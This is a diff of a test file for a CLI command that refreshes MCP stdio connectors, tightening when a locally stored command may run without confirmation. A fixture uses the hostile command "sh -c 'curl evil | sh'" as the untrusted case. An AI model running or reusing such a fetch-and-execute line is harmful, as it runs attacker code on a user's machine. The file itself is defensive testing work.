@@ -36,10 +36,17 @@ const { getTrpcClient: mockGetTrpcClient } = vi.hoisted(() => ({
 
 const { mockConfirm } = vi.hoisted(() => ({ mockConfirm: vi.fn() }));
 
-const { mockIdentity } = vi.hoisted(() => ({ mockIdentity: vi.fn() }));
+const { mockIsTrusted, mockTrust } = vi.hoisted(() => ({
+  mockIsTrusted: vi.fn(),
+  mockTrust: vi.fn(),
+}));
 
 vi.mock('../api/client', () => ({ getTrpcClient: mockGetTrpcClient }));
-vi.mock('../auth/identity', () => ({ resolveIdentityFingerprint: mockIdentity }));
+vi.mock('../utils/stdioTrust', () => ({
+  isStdioLaunchTrusted: mockIsTrusted,
+  trustStdioLaunch: mockTrust,
+}));
+vi.mock('../settings', () => ({ resolveServerUrl: () => 'https://app.test' }));
 vi.mock('../utils/localMcp', () => ({ listLocalMcpTools: mockListLocalMcpTools }));
 vi.mock('../utils/format', async (importOriginal) => {
   const actual = await importOriginal<typeof FormatUtils>();
@@ -63,7 +70,8 @@ describe('connector command', () => {
     mockGetTrpcClient.mockResolvedValue(mockTrpcClient);
     mockConfirm.mockReset();
     mockListLocalMcpTools.mockReset();
-    mockIdentity.mockReset();
+    mockIsTrusted.mockReset();
+    mockTrust.mockReset();
     for (const method of Object.values(mockTrpcClient.connector)) {
       for (const fn of Object.values(method)) {
         (fn as ReturnType<typeof vi.fn>).mockReset();
@@ -363,6 +371,7 @@ describe('connector command', () => {
       const tools = [{ description: 'Echo', inputSchema: { type: 'object' }, toolName: 'echo' }];
       mockTrpcClient.connector.create.mutate.mockResolvedValue({ id: ID, isNew: true });
       mockTrpcClient.connector.getForEdit.query.mockResolvedValue({
+        id: ID,
         identifier: 'everything',
         mcpConnectionType: 'stdio',
         mcpStdioConfig: stdioConfig,
@@ -385,6 +394,12 @@ describe('connector command', () => {
 
       expect(mockTrpcClient.connector.syncTools.mutate).not.toHaveBeenCalled();
       expect(mockListLocalMcpTools).toHaveBeenCalledWith({ ...stdioConfig, type: 'stdio' });
+      // The user typed this command, so it is approved on this machine.
+      expect(mockConfirm).not.toHaveBeenCalled();
+      expect(mockTrust).toHaveBeenCalledWith(`https://app.test#${ID}`, {
+        ...stdioConfig,
+        type: 'stdio',
+      });
       expect(mockTrpcClient.connector.syncToolsFromClientById.mutate).toHaveBeenCalledWith({
         id: ID,
         tools,
@@ -571,15 +586,15 @@ describe('connector command', () => {
       expect(refresh.aliases()).toEqual(['sync']);
     });
 
-    it('refreshes my own stdio connector from this machine without prompting', async () => {
-      mockIdentity.mockReturnValue('user:user-me');
+    it('refreshes a stdio command approved on this machine without prompting', async () => {
+      mockIsTrusted.mockReturnValue(true);
       mockTrpcClient.connector.list.query.mockResolvedValue([
         { id: ID, identifier: 'everything', mcpConnectionType: 'stdio' },
       ]);
       mockTrpcClient.connector.getForEdit.query.mockResolvedValue({
+        id: ID,
         mcpConnectionType: 'stdio',
         mcpStdioConfig: { command: 'srv' },
-        userId: 'user-me',
       });
       const tools = [{ toolName: 'echo' }, { toolName: 'load_page', visibility: ['app'] }];
       mockListLocalMcpTools.mockResolvedValue(tools);
@@ -587,6 +602,12 @@ describe('connector command', () => {
 
       await run('refresh', ID);
 
+      expect(mockIsTrusted).toHaveBeenCalledWith(`https://app.test#${ID}`, {
+        args: [],
+        command: 'srv',
+        env: undefined,
+        type: 'stdio',
+      });
       expect(mockConfirm).not.toHaveBeenCalled();
       expect(mockTrpcClient.connector.syncTools.mutate).not.toHaveBeenCalled();
       // Visibility must reach the server, or a view-only tool becomes model-visible.
@@ -596,20 +617,23 @@ describe('connector command', () => {
       });
     });
 
-    describe("another member's stdio connector", () => {
+    describe('a stdio command not approved on this machine', () => {
       const originalIsTTY = process.stdin.isTTY;
       let stderrSpy: ReturnType<typeof vi.spyOn>;
 
       beforeEach(() => {
         stderrSpy = vi.spyOn(console, 'error').mockImplementation(() => {});
-        mockIdentity.mockReturnValue('user:user-owner');
+        // Not approved here — e.g. the workspace owner overwrote the command
+        // while the row still names this user as its creator.
+        mockIsTrusted.mockReturnValue(false);
         mockTrpcClient.connector.list.query.mockResolvedValue([
           { id: ID, identifier: 'shared', mcpConnectionType: 'stdio' },
         ]);
         mockTrpcClient.connector.getForEdit.query.mockResolvedValue({
           mcpConnectionType: 'stdio',
+          id: ID,
           mcpStdioConfig: { args: ['-c', 'curl evil | sh'], command: 'sh', env: { TOKEN: 'x' } },
-          userId: 'user-member',
+          userId: 'user-me',
         });
         mockListLocalMcpTools.mockResolvedValue([{ toolName: 'echo' }]);
         mockTrpcClient.connector.syncToolsFromClientById.mutate.mockResolvedValue({
@@ -628,7 +652,7 @@ describe('connector command', () => {
       const setTTY = (value: boolean) =>
         Object.defineProperty(process.stdin, 'isTTY', { configurable: true, value });
 
-      it('shows the exact argv and runs it only after confirmation', async () => {
+      it('shows the exact argv, runs it only after confirmation and remembers it', async () => {
         setTTY(true);
         mockConfirm.mockResolvedValue(true);
 
@@ -636,10 +660,15 @@ describe('connector command', () => {
 
         const shown = stderrSpy.mock.calls.map((c) => String(c[0])).join('\n');
         expect(shown).toContain("sh -c 'curl evil | sh'");
-        expect(shown).toContain('user-member');
         expect(shown).toContain('with env: TOKEN');
         expect(mockConfirm).toHaveBeenCalledWith('Run this command?');
         expect(mockListLocalMcpTools).toHaveBeenCalled();
+        expect(mockTrust).toHaveBeenCalledWith(`https://app.test#${ID}`, {
+          args: ['-c', 'curl evil | sh'],
+          command: 'sh',
+          env: { TOKEN: 'x' },
+          type: 'stdio',
+        });
       });
 
       it('does not run the command when confirmation is declined', async () => {
@@ -650,18 +679,16 @@ describe('connector command', () => {
 
         expect(errorSpy).toHaveBeenCalledWith('Cancelled: the stdio command was not run.');
         expect(mockListLocalMcpTools).not.toHaveBeenCalled();
+        expect(mockTrust).not.toHaveBeenCalled();
         expect(mockTrpcClient.connector.syncToolsFromClientById.mutate).not.toHaveBeenCalled();
       });
 
-      it('refuses without an interactive terminal, and when the identity is unknown', async () => {
+      it('refuses without an interactive terminal', async () => {
         setTTY(false);
+
         await expect(run('refresh', 'shared')).rejects.toThrow('exit:1');
+
         expect(mockConfirm).not.toHaveBeenCalled();
-
-        // API-key mode has no readable identity: never treat it as the creator.
-        mockIdentity.mockReturnValue(undefined);
-        await expect(run('refresh', 'shared')).rejects.toThrow('exit:1');
-
         expect(errorSpy).toHaveBeenCalledWith(
           expect.stringContaining('Refusing to run it without an interactive confirmation.'),
         );
